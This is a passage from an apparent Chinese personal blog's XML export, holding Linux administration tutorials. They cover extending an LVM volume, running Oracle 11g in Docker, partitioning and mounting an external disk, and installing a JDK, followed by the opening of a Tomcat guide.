-wi-a-----   5.00g</span><br><span class="line">  lv_backup vg02   -wi-ao----  &lt;8.00g</span><br></pre></td></tr></tbody></table></figure></li>
<li>扩展逻辑卷容量，用到的命令是 <code>lvextend</code>，其后面的参数和 <code>lvcreate</code> 类似，不同参数和值对逻辑卷的扩容效果如下所示。
&gt; 注意： 只有 ext2，ext3，ext4，ReiserFS 和 XFS
文件系统支持以下操作，其他文件系统需要去掉 <code>--resizefs</code> 参数，并利用其他工具调整对应的文件系统大小。</li>
<li>对逻辑卷增大容量 2G：<code>lvextend -L 2G /dev/vg02/lv_backup</code>。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# lvextend -L +2G /dev/vg02/lv_backup</span><br><span class="line">  Size of logical volume vg02/lv_backup changed from &lt;8.00 GiB (2047 extents) to &lt;10.00 GiB (2559 extents).</span><br><span class="line">  Logical volume vg02/lv_backup successfully resized.</span><br><span class="line">[root@centos7-1 ~]# lvs</span><br><span class="line">  LV        VG     Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class="line">  root      centos -wi-ao---- &lt;17.00g</span><br><span class="line">  swap      centos -wi-ao----   2.00g</span><br><span class="line">  lv_data   vg01   -wi-a-----   3.99g</span><br><span class="line">  lv_doc    vg01   -wi-a-----   5.00g</span><br><span class="line">  lv_music  vg01   -wi-a-----   5.00g</span><br><span class="line">  lv_backup vg02   -wi-ao---- &lt;10.00g</span><br></pre></td></tr></tbody></table></figure></li>
<li>对逻辑卷调整容量至 12G，并调整对应文件系统大小：<code>lvextend -L 12G --resizefs /dev/vg02/lv_backup</code>。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# lvextend -L 12G --resizefs /dev/vg02/lv_backup</span><br><span class="line">  Size of logical volume vg02/lv_backup changed from &lt;10.00 GiB (2559 extents) to 12.00 GiB (3072 extents).</span><br><span class="line">  Logical volume vg02/lv_backup successfully resized.</span><br><span class="line">resize2fs 1.42.9 (28-Dec-2013)</span><br><span class="line">Filesystem at /dev/mapper/vg02-lv_backup is mounted on /mnt/backup; on-line resizing required</span><br><span class="line">old_desc_blocks = 1, new_desc_blocks = 2</span><br><span class="line">The filesystem on /dev/mapper/vg02-lv_backup is now 3145728 blocks long.</span><br><span class="line"></span><br><span class="line">[root@centos7-1 ~]# lvs</span><br><span class="line">  LV        VG     Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class="line">  root      centos -wi-ao---- &lt;17.00g</span><br><span class="line">  swap      centos -wi-ao----   2.00g</span><br><span class="line">  lv_data   vg01   -wi-a-----   3.99g</span><br><span class="line">  lv_doc    vg01   -wi-a-----   5.00g</span><br><span class="line">  lv_music  vg01   -wi-a-----   5.00g</span><br><span class="line">  lv_backup vg02   -wi-ao----  12.00g</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>LVM</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】基于 UbuntuServer 系统在 docker 中安装 Oracle11g 数据库</title>
    <url>/p/31c303f.html</url>
    <content><![CDATA[<h1 id="前提条件">1. 前提条件</h1>
<ol type="1">
<li>已安装 docker，并配置好国内的软件源 &gt;
可参考<a href="/p/1b1c0bcb.html#8-安装Docker" target="_blank">《【Linux】基于树莓派
4B 安装 Ubuntu Server 系统及必要配置》</a>第 8 章节。</li>
</ol>
<span id="more"></span>
<h1 id="拉取镜像">2. 拉取镜像</h1>
<ol type="1">
<li><p>执行如下命令，拉取 Oracle 11g 镜像，镜像比较大，耐心等一会儿。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">docker pull registry.aliyuncs.com/helowin/oracle_11g </span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>下载完成后，执行如下命令，查看镜像，并记录 IMAGE ID。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~/app/oracle$ docker images</span><br><span class="line">REPOSITORY                                 TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">portainer/portainer-ce                     latest    96a1c6cc3d15   4 weeks ago   209MB</span><br><span class="line">registry.aliyuncs.com/helowin/oracle_11g   latest    3fa112fd3642   5 years ago   6.85GB</span><br><span class="line">ubuntu@ubuntu:~/app/oracle$</span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<hr>
<h1 id="启动容器">3. 启动容器</h1>
<ol type="1">
<li><p>执行如下命令，启动容器，各参数说明如下。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">docker run -d -p 1521:1521 --name oracle11g 3fa112fd3642</span><br></pre></td></tr></tbody></table></figure> &gt;
-d：持久化运行，即退出终端后，容器在后台运行 &gt;
-p：手动映射端口号，分号前表示宿主机端口，分号后表示容器内的端口 &gt;
--name：容器名称，自定义即可 &gt;
3fa112fd3642：容器 ID，或替换成容器地址，即 <code>registry.aliyuncs.com/helowin/oracle_11g</code><p></p></li>
<li><p>执行如下命令，查看容器启动状态。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ docker ps</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS                              NAMES</span><br><span class="line">29e6c739c87d   3fa112fd3642   <span class="string">"/bin/sh -c '/home/o…"</span>   55 minutes ago   Up 51 minutes   0.0.0.0:1521-&gt;1521/tcp             oracle11g</span><br><span class="line">859e1debd3fb   96a1c6cc3d15   <span class="string">"/portainer"</span>             56 minutes ago   Up 56 minutes   8000/tcp, 0.0.0.0:9000-&gt;9000/tcp   portainer</span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<hr>
<h1 id="数据库配置">4. 数据库配置</h1>
<h2 id="修改数据库用户名">4.1. 修改数据库用户名</h2>
<ol type="1">
<li><p>在宿主机上创建一个 oracle 路径。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /home/ubuntu/app/oracle</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>进入 Oracle 容器终端。 &gt;
注意，oracle11g 需要替换成自己的容器名称。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it oracle11g bash</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>切换到 root 用户，编辑 profile 文件。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 默认密码: helowin</span></span><br><span class="line">su - root</span><br><span class="line">vi /etc/profile</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>在 profile 文件最后，添加如下内容。 &gt;
注意 ORACLE_HOME 替换成第一步创建的 oracle 路径，其他保持默认
</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"># oracle settings</span><br><span class="line">export ORACLE_HOME=/home/ubuntu/app/oracle/product/11.2.0/dbhome_2</span><br><span class="line">export ORACLE_SID=helowin</span><br><span class="line">export PATH=$ORACLE_HOME/bin:$PATH</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>使 profile 生效。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>创建 sqlplus 命令软连接 &gt; 一定要在 root 用户下执行。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s <span class="variable">$ORACLE_HOME</span>/bin/sqlplus /usr/bin</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>切换到 oracle 用户， 登录 sqlplus，修改数据库用户密码
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">su - oracle</span><br><span class="line">sqlplus /nolog</span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">*</span>Plus: <span class="keyword">Release</span> <span class="number">11.2</span><span class="number">.0</span><span class="number">.1</span><span class="number">.0</span> Production <span class="keyword">on</span> Sat Mar <span class="number">6</span> <span class="number">15</span>:<span class="number">43</span>:<span class="number">04</span> <span class="number">2021</span></span><br><span class="line">Copyright (c) <span class="number">1982</span>, <span class="number">2009</span>, Oracle.  <span class="keyword">All</span> rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 以sysdba身份连接</span></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> conn <span class="operator">/</span> <span class="keyword">as</span> sysdba</span><br><span class="line">Connected.</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改system用户密码</span></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">user</span> <span class="keyword">system</span> identified <span class="keyword">by</span> oracle;</span><br><span class="line"><span class="keyword">User</span> altered.</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改sys用户密码</span></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">user</span> sys identified <span class="keyword">by</span> oracle;</span><br><span class="line"><span class="keyword">User</span> altered.</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改密码为永不过期</span></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">ALTER</span> PROFILE <span class="keyword">DEFAULT</span> LIMIT PASSWORD_LIFE_TIME UNLIMITED;</span><br><span class="line">Profile altered.</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> exit</span><br><span class="line">Disconnected <span class="keyword">from</span> Oracle Database <span class="number">11</span>g Enterprise Edition <span class="keyword">Release</span> <span class="number">11.2</span><span class="number">.0</span><span class="number">.1</span><span class="number">.0</span> <span class="operator">-</span> <span class="number">64</span>bit Production</span><br><span class="line"><span class="keyword">With</span> the Partitioning, OLAP, Data Mining <span class="keyword">and</span> <span class="type">Real</span> Application Testing options</span><br></pre></td></tr></tbody></table></figure>
<h2 id="创建表空间和用户">4.2. 创建表空间和用户</h2>
<ol type="1">
<li>利用 PLSQL Developer，连接数据库。</li>
</ol>
<figure>
<img src="https://ae01.alicdn.com/kf/Ubadd4c4f749b43419b58c1d64014d115x.jpg" alt="sys用户登录数据库">
<figcaption aria-hidden="true">sys 用户登录数据库</figcaption>
</figure>
<ol start="2" type="1">
<li><p>新建一个 sql 窗口，运行如下代码以创建表空间。
</p><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*创建表空间，指定大小及文件路径*/</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span>space SALARY</span><br><span class="line">logging</span><br><span class="line">datafile <span class="string">'/home/oracle/app/oracle/oradata/helowin/SALARY.dbf'</span> </span><br><span class="line">size <span class="number">20</span>m</span><br><span class="line">autoextend <span class="keyword">on</span></span><br><span class="line">next <span class="number">50</span>m maxsize <span class="number">5120</span>m</span><br><span class="line">extent management <span class="keyword">local</span>;</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>运行以下代码以创建用户并授权。 &gt;
用户名及密码根据自身需要修改，默认表空间名需要修改成上一步创建的表空间名
</p><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*创建用户*/</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> user_name identified <span class="keyword">by</span> user_password <span class="keyword">default</span> tablespace SALARY temporary tablespace temp;</span><br><span class="line"><span class="comment">/*授权*/</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">connect</span>, resource <span class="keyword">to</span> salary_user;</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>使用创建的用户登录数据库。</p></li>
</ol>
<figure>
<img src="https://ae01.alicdn.com/kf/U86da5b7fea3f444b93d86e6b173cebedC.jpg" alt="创建用户登录数据库">
<figcaption aria-hidden="true">创建用户登录数据库</figcaption>
</figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Database</tag>
        <tag>Oracle</tag>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】基于 Ubuntu 临时 / 永久挂载外置移动硬盘</title>
    <url>/p/f9323c68.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>  一块移动硬盘，如果直接以 USB 方式连接到 Windows，不用做其他操作，就可被 Windows 识别和使用。而到了 Linux 系统中，就需要挂载 Linux 服务器上，才能够正常使用。本篇博客，则基于 Ubuntu 系统，就如何挂载外置硬盘，进行详细的介绍。</p>
<span id="more"></span>
<hr>
<h1 id="操作步骤">2. 操作步骤</h1>
<h2 id="查看磁盘信息">2.1. 查看磁盘信息</h2>
<ol type="1">
<li>执行 <code>sudo fdisk -l</code> 命令，查看当前磁盘信息，可得知：</li>
</ol>
<ul>
<li>当前服务器有两块硬盘，<code>/dev/mmcblk0</code> 和 <code>/dev/sda</code>，前者是我的 Linux 系统主硬盘（16G），后者则是以 USB 方式连接的外置移动硬盘（1T）。</li>
<li>当前外置硬盘存在两个分区，<code>/dev/sda1</code> 和 <code>/dev/sda2</code>。其中，<code>/dev/sda2</code> 分区类型是 Linux
filesystem，也是用于存放资料的主分区。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">sudo</span> fdisk -l</span><br><span class="line">Disk /dev/mmcblk0: 14.66 GiB, 15720251392 bytes, 30703616 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x4ec8ea53</span><br><span class="line"></span><br><span class="line">Device         Boot  Start      End  Sectors  Size Id Type</span><br><span class="line">/dev/mmcblk0p1 *      2048   526335   524288  256M  c W95 FAT32 (LBA)</span><br><span class="line">/dev/mmcblk0p2      526336 30703582 30177247 14.4G 83 Linux</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sda: 931.53 GiB, 1000204886016 bytes, 1953525168 sectors</span><br><span class="line">Disk model:                 </span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 4096 bytes</span><br><span class="line">I/O size (minimum/optimal): 4096 bytes / 4096 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: gpt</span><br><span class="line">Disk identifier: 2D82DA89-5AE6-4AA0-B24C-740AA200E065</span><br><span class="line"></span><br><span class="line">Device      Start        End    Sectors   Size Type</span><br><span class="line">/dev/sda1      40     409639     409600   200M EFI System</span><br><span class="line">/dev/sda2  411648 1953523711 1953112064 931.3G Linux filesystem</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h2 id="新建分区">2.2. 新建分区</h2>
<ol type="1">
<li><p>执行 <code>sudo fdisk /dev/sda</code> 命令，进入 fdisk 工具控制台中，此工具可对磁盘及分区进行修改等操作。
&gt; /dev/sda 部分根据个人实际情况修改 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">sudo</span> fdisk /dev/sda</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.34).</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, <span class="keyword">until</span> you decide to write them.</span><br><span class="line">Be careful before using the write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): </span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>输入 <code>p</code>，打印当前的分区信息。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p</span><br><span class="line">Disk /dev/sda: 931.53 GiB, 1000204886016 bytes, 1953525168 sectors</span><br><span class="line">Disk model:                 </span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 4096 bytes</span><br><span class="line">I/O size (minimum/optimal): 4096 bytes / 4096 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: gpt</span><br><span class="line">Disk identifier: 2D82DA89-5AE6-4AA0-B24C-740AA200E065</span><br><span class="line"></span><br><span class="line">Device      Start        End    Sectors   Size Type</span><br><span class="line">/dev/sda1      40     409639     409600   200M EFI System</span><br><span class="line">/dev/sda2  411648 1953523711 1953112064 931.3G Linux filesystem</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>输入 <code>n</code>，按照界面提示，设置分区序号、分区起始块、分区大小等信息，即可新增一个分区。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition number (3-128, default 3): 3</span><br><span class="line">First sector (34-1953525134, default 411648): </span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<h2 id="转换分区类型">2.3. 转换分区类型</h2>
<ol type="1">
<li><p>如果新建分区后，想要转换成另外一种分区格式，则可通过如下操作进行转换。</p></li>
<li><p>输入 <code>sudo fdisk /dev/sda</code> 命令，进入 fdisk 工具控制台中。
&gt; /dev/sda 部分根据个人实际情况修改 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">sudo</span> fdisk /dev/sda</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.34).</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, <span class="keyword">until</span> you decide to write them.</span><br><span class="line">Be careful before using the write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):    </span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>输入 <code>t</code>，进入分区转换步骤。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): t</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>输入想要转换分区类型的序号，磁盘的分区序号可参考：<a href="#2-2-新建分区">新建分区</a>第 1、2 步。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Partition number (1,2, default 2): 2</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>输入 <code>L</code>，将展示可被转换的分区类型。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Partition <span class="built_in">type</span> (<span class="built_in">type</span> L to list all types): L</span><br><span class="line">  1 EFI System                     C12A7328-F81F-11D2-BA4B-00A0C93EC93B</span><br><span class="line">  2 MBR partition scheme           024DEE41-33E7-11D3-9D69-0008C781F39F</span><br><span class="line">  3 Intel Fast Flash               D3BFE2DE-3DAF-11DF-BA40-E3A556D89593</span><br><span class="line">  4 BIOS boot                      21686148-6449-6E6F-744E-656564454649</span><br><span class="line">  5 Sony boot partition            F4019732-066E-4E12-8273-346C5641494F</span><br><span class="line">  6 Lenovo boot partition          BFBFAFE7-A34F-448A-9A5B-6213EB736C22</span><br><span class="line">  7 PowerPC PReP boot              9E1A2D38-C612-4316-AA26-8B49521E5A8B</span><br><span class="line">  8 ONIE boot                      7412F7D5-A156-4B13-81DC-867174929325</span><br><span class="line">  9 ONIE config                    D4E6E2CD-4469-46F3-B5CB-1BFF57AFC149</span><br><span class="line"> 10 Microsoft reserved             E3C9E316-0B5C-4DB8-817D-F92DF00215AE</span><br><span class="line"> 11 Microsoft basic data           EBD0A0A2-B9E5-4433-87C0-68B6B72699C7</span><br><span class="line"> 12 Microsoft LDM metadata         5808C8AA-7E8F-42E0-85D2-E1E90434CFB3</span><br><span class="line"> 13 Microsoft LDM data             AF9B60A0-1431-4F62-BC68-3311714A69AD</span><br><span class="line"> 14 Windows recovery environment   DE94BBA4-06D1-4D40-A16A-BFD50179D6AC</span><br><span class="line"> 15 IBM General Parallel Fs        37AFFC90-EF7D-4E96-91C3-2D7AE055B174</span><br><span class="line"> 16 Microsoft Storage Spaces       E75CAF8F-F680-4CEE-AFA3-B001E56EFC2D</span><br><span class="line"> 17 HP-UX data                     75894C1E-3AEB-11D3-B7C1-7B03A0000000</span><br><span class="line"> 18 HP-UX service                  E2A1E728-32E3-11D6-A682-7B03A0000000</span><br><span class="line"> 19 Linux swap                     0657FD6D-A4AB-43C4-84E5-0933C84B4F4F</span><br><span class="line"> 20 Linux filesystem               0FC63DAF-8483-4772-8E79-3D69D8477DE4</span><br><span class="line"> 21 Linux server data              3B8F8425-20E0-4F3B-907F-1A25A76F98E8</span><br><span class="line"> 22 Linux root (x86)               44479540-F297-41B2-9AF7-D131D5F0458A</span><br><span class="line"> 23 Linux root (ARM)               69DAD710-2CE4-4E3C-B16C-21A1D49ABED3</span><br><span class="line"> 24 Linux root (x86-64)            4F68BCE3-E8CD-4DB1-96E7-FBCAF984B709</span><br><span class="line"> 25 Linux root (ARM-64)            B921B045-1DF0-41C3-AF44-4C6F280D3FAE</span><br><span class="line"> ...</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>输入 <code>q</code> 退出展示后，再输入想要转换分区类型的序号回车即可。例如想要 Linux
filesystem，则输入: 20。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Partition <span class="built_in">type</span> (<span class="built_in">type</span> L to list all types): 20</span><br><span class="line"></span><br><span class="line">Changed <span class="built_in">type</span> of partition <span class="string">'Linux filesystem'</span> to <span class="string">'Linux filesystem'</span>.</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>最后一步，也是至关重要的一步，输入 <code>w</code> 回车保存。 &gt;
在进入 fdisk 工具控制台时，有这么一句话：<code>Changes will remain in memory only, until you decide to write them.</code>。意思是所有的更改都仅仅保存在内存中，只有输入了 <code>w</code> 命令，才会同步更改到磁盘，并使之生效。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): w</span><br><span class="line">The partition table has been altered.</span><br><span class="line">Syncing disks.</span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~$ </span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<h2 id="临时挂载磁盘">2.4. 临时挂载磁盘</h2>
<ol type="1">
<li><p>如果仅仅只是临时使用磁盘，用完之后就断开连接的话，则可以使用如下命令，临时挂载到 Linux 系统中。
&gt;
/home/ubunt/myDisk 根据个人情况修改，可挂载在常见的 <code>/mnt</code> 目录下，也可以自定义挂载目录。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">mount /dev/sda2 /home/ubunt/myDisk</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>使用如下命令，卸载磁盘。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">umount /home/ubuntu/myDisk</span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<h2 id="永久挂载磁盘">2.5. 永久挂载磁盘</h2>
<ol type="1">
<li><p>如果是类似于个人网盘服务器的场景，移动硬盘需要长时间连接至 Linux 系统，即使关机重启后，也能自动挂载，那么就可以修改一下 /etc/fstab 文件，使硬盘永久挂载。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/fstab</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>按照如下格式，在最后一行加入如下配置。 &gt; 配置说明 &gt;
/dev/sda2: 挂载的分区 &gt; /home/ubuntu/myDisk: 被挂载的 Linux 目录 &gt;
exfat: 挂载分区的分区类型 &gt; defaults: 保持默认即可 &gt; 转储标志:
0 表示不备份 &gt; fsck 顺序:
运行 fsck 磁盘检查时的顺序字段，如果是引导分区，则为 1，否则设置为 0 或 2
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">/dev/sda2 /home/ubuntu/myDisk exfat defaults 0 0</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>输入 <code>sudo mount -a</code> 命令，即可重新挂载所有磁盘。使用 <code>df -h</code> 命令，查看磁盘挂载情况。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">df</span> -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">udev            1.9G     0  1.9G   0% /dev</span><br><span class="line">tmpfs           380M  4.2M  376M   2% /run</span><br><span class="line">/dev/mmcblk0p2   15G  4.7G  8.9G  35% /</span><br><span class="line">tmpfs           1.9G     0  1.9G   0% /dev/shm</span><br><span class="line">tmpfs           5.0M     0  5.0M   0% /run/lock</span><br><span class="line">tmpfs           1.9G     0  1.9G   0% /sys/fs/cgroup</span><br><span class="line">/dev/loop1       62M   62M     0 100% /snap/lxd/19040</span><br><span class="line">/dev/loop0       49M   49M     0 100% /snap/core18/1949</span><br><span class="line">/dev/loop2       27M   27M     0 100% /snap/snapd/10709</span><br><span class="line">/dev/mmcblk0p1  253M  118M  135M  47% /boot/firmware</span><br><span class="line">tmpfs           380M     0  380M   0% /run/user/1000</span><br><span class="line">/dev/loop3       29M   29M     0 100% /snap/snapd/11115</span><br><span class="line">/dev/sda2       932G  124G  808G  14% /home/ubuntu/myDisk</span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>磁盘挂载</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】基于 Ubuntu 系统中安装 JDK</title>
    <url>/p/ccdf5eaf.html</url>
    <content><![CDATA[<h1 id="前期准备">1. 前期准备</h1>
<p>  根据自身需要，下载所需版本的 Java Development
Kit 安装包。下载链接如下： &gt; 官网（需要 Oracle 账号）：<a href="https://www.oracle.com/java/technologies/javase-downloads.html">Java
SE - Downloads</a> &gt; 华为源：<a href="https://repo.huaweicloud.com/java/jdk/">https://repo.huaweicloud.com/java/jdk/</a></p>
<span id="more"></span>
<figure>
<img src="/p/ccdf5eaf/jdk下载页面.webp" alt="jdk下载页面">
<figcaption aria-hidden="true">jdk 下载页面</figcaption>
</figure>
<hr>
<h1 id="安装过程">2. 安装过程</h1>
<ol type="1">
<li>将下载好的 jdk 安装包，拷贝至 Ubuntu 系统中，cd 至 jdk 所在目录后，使用命令解压至指定路径下。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">tar -zxvf jdk-7u80-linux-x64.tar.gz -C /home/boyce/App/</span><br></pre></td></tr></tbody></table></figure> &gt; 其中： &gt;
jdk-7u80-linux-x64.tar.gz：是下载的 jdk 文件名； &gt;
/home/boyce/App：是您想要存放安装软件的路径。</li>
</ol>
<figure>
<img src="/p/ccdf5eaf/解压jdk.webp" alt="解压jdk">
<figcaption aria-hidden="true">解压 jdk</figcaption>
</figure>
<ol start="2" type="1">
<li><p> 解压完成后，接下来，需要配置环境变量。使用超级管理员身份编辑 profile 文件
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/profile</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>按 i 进入编辑模式，在最后一行中，加入如下代码（# 号后面是注释，可忽略）
</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># java environment</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/home/boyce/app/oracleJDK   <span class="comment"># 修改成你自己的jdk安装路径</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">${JAVA_HOME}</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">${JAVA_HOME}</span>/jre</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">${JAVA_HOME}</span>/lib:<span class="variable">${JAVA_HOME}</span>/lib</span><br></pre></td></tr></tbody></table></figure> <img src="/p/ccdf5eaf/配置环境变量.webp" alt="配置环境变量"><p></p></li>
<li><p>编辑完成后，按:wq 键，保存并退出。</p></li>
<li><p>输入如下命令，使之生效。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></tbody></table></figure> *** # 3. 检查是否生效
  打开终端，输入如下命令，如果没有报错，并且正确显示所安装的 Java 版本号，即表示已安装完成。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></tbody></table></figure> <img src="/p/ccdf5eaf/检查jdk是否生效.webp" alt="检查jdk是否生效"><p></p></li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>JDK</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】基于 Ubuntu 系统中安装 Tomcat</title>
    <url>/p/74ba6bba.html</url>
    <content><![CDATA[<h1 id="前期准备">1. 前期准备</h1>
<p>  在安装 Tomcat 之前，需要先安装好 JDK，并配置环境变量。可参考：
<a href="/p/ccdf5eaf.html" target="_blank">【Linux 运维】【基础】Ubuntu 系统中安装 JDK</a></p>
<p>  在官网下载所需版本的 Tomcat。下载链接:<a href="https://tomcat.apache.org/download-80.cgi">Apache Tomcat®</a></p>
<span id="more"></span>
<figure>
<img src="/p/74ba6bba/Tomcat官网下载界面.webp" alt="Tomcat官网下载界面">
<figcaption aria-hidden="true">Tomcat 官网下载界面</figcaption>
</figure>
<hr>
